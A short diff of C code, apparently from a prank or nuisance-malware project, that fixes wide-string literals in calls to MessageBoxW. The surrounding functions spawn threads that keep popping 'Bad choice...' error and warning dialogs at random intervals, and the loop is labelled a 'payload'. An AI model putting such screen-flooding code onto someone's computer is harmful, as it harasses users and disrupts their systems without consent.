@@ -280,12 +280,12 @@ SpamMessageBoxes(VOID)
 {
 	if (Xorshift32() % 2 == 0)
 	{
-		MessageBoxW(NULL, L"Bad choice...", "Bad mistake...", MB_ABORTRETRYIGNORE | MB_ICONERROR);
+		MessageBoxW(NULL, L"Bad choice...", L"Bad mistake...", MB_ABORTRETRYIGNORE | MB_ICONERROR);
 		Sleep(10);
 	}
 	else
 	{
-		MessageBoxW(NULL, L"Bad choice...", "Bad mistake...", MB_YESNO | MB_ICONWARNING);
+		MessageBoxW(NULL, L"Bad choice...", L"Bad mistake...", MB_YESNO | MB_ICONWARNING);
 		Sleep(10);
 	}
 }
@@ -299,4 +299,5 @@ MessageBoxPayload(VOID)
 		CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)SpamMessageBoxes, NULL, 0, NULL));
 		Sleep(Xorshift32() % 2000);
 	}
+
 }
